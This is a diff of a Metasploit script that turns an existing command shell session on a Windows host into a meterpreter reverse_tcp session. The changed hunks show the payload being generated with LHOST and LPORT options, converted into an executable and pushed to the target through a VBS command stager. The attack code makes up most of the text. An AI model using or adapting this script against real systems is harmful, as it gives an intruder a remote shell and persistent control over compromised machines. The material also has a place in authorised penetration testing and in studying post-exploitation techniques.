@@ -2,7 +2,7 @@
 #
 # Spawn a meterpreter session using an existing command shell session
 #
-# NOTE: Some of the following code is duplicated from lib/msf/core/exploit/cmdstager.rb
+# NOTE: Some of the following code is duplicated from the VBS CmdStager
 #
 # This is really only to prove the concept for now.
 #
@@ -33,7 +33,6 @@ payload_name = 'windows/meterpreter/reverse_tcp'
 payload = framework.payloads.create(payload_name)
 options = 'LHOST='+lhost + ' LPORT='+lport
 buf = payload.generate_simple('OptionStr' => options)
-
 
 #
 # Spawn the handler if needed
@@ -71,25 +70,28 @@ end
 
 
 #
-# Setup the command stager
+# Make the payload into an exe for the CmdStager
 #
-los = 'win'
-larch = ARCH_X86
+lplat = [Msf::Platform::Windows]
+larch = [ARCH_X86]
 opts = {
+	:linemax => 1700,
 	#:persist => true
 }
-linelen = 1700
 delay = 0.25
+exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)
+
 
 #
 # Generate the stager command array
 #
-cmdstager = Rex::Exploitation::CmdStager.new(buf, framework, los, larch)
-cmds = cmdstager.generate(opts, linelen)
+cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
+cmds = cmdstager.generate(opts)
 if (cmds.nil? or cmds.length < 1)
 	print_error("The command stager could not be generated")
 	raise ArgumentError
 end
+
 
 #
 # Calculate the total size
